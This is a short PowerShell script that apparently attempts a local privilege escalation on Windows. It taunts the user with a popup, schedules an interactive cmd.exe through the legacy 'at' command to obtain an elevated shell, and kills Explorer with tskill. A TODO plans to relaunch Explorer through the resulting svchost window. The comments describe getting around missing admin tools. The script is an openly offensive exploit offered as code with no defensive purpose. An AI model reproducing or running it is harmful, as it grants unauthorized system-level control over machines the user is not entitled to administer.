#Fetch the process id and session id from explorer in the process list
$explorerProcess = (get-process -Name explorer)
$procid = $explorerProcess.id
$sessionid = $explorerProcess.SessionID

#Create variable with current time + one minute
# $time = (Get-Date).AddMinutes(1).ToString('HH:mm') #Perhaps change to "AddSeconds" to optimize performance
$time = (Get-Date).AddSeconds(5).ToString('HH:mm:ss')

# Temporary popup message
$popup = msg $sessionID "Nothing personal, kid..."

#Schedule Command Prompt to open at $time
at $time /interactive cmd.exe

#Kill Windows Explorer without automatically opening again
# taskkill /F /IM explorer.exe
# We don't have access to taskkill, since we don't have professional edition
# Explorer still opens after being killed with tskill
# Perhaps https://superuser.com/questions/511914/why-does-explorer-restart-automatically-when-i-kill-it-with-process-kill
tskill $procid


#TODO
#Send keystrokes to "svchost.exe" window to open explorer.exe